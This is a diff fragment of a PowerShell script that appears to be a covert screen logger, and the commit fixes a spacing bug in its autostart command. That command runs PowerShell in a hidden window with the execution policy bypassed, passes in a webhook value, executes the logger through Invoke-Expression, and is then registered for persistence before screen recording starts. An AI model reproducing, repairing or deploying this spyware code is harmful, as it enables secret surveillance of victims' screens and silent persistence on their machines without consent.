@@ -97,7 +97,7 @@ if(-not (Test-Path -Path "ffmpeg/ffmpeg.exe" -PathType Leaf)){
 }
 
 $name + "screenlog";
-$autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun  + '$DaysRun=' + $DaysRun +  ';Get-Item' + $name + '.ps1 | Invoke-Expression;sleep 5;exit');
+$autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun  + '$DaysRun=' + $DaysRun +  ';Get-Item ' + $name + '.ps1 | Invoke-Expression;sleep 5;exit');
 
 Add-LoggerPersistency $name -Command $autostart; -Days $DaysRun
 Start-Screenlogger -RecordTime $RecordTime -TimesRun $TimesRun -Delay $Delay;
